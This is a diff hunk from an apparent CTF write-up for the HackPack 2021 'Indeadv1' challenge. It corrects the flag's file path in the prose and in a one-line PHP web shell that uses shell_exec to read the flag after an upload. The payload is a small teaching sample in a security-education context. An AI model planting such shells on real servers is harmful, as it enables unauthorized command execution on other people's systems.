@@ -68,12 +68,12 @@ It is successfully uploaded
 
 ![image-Indeadv1-8](https://github.com/Ch3lLIST4/CTF-Writeups-2021/blob/main/HackPack-CTF-2021/images/Indeadv1-8.png?raw=true)
 
-After wandering around, I found out that the flag was being hidden at `/www/html/flag.txt`
+After wandering around, I found out that the flag was being hidden at `/var/www/flag.txt`
 
 I crafted the final shell to read the flag :
 
 ```php
-<?php echo shell_exec("cat /www/html/flag.txt"); __halt_compiler();
+<?php echo shell_exec("cat /var/www/flag.txt"); __halt_compiler();
 ```
 
 ![image-Indeadv1-9](https://github.com/Ch3lLIST4/CTF-Writeups-2021/blob/main/HackPack-CTF-2021/images/Indeadv1-9.png?raw=true)
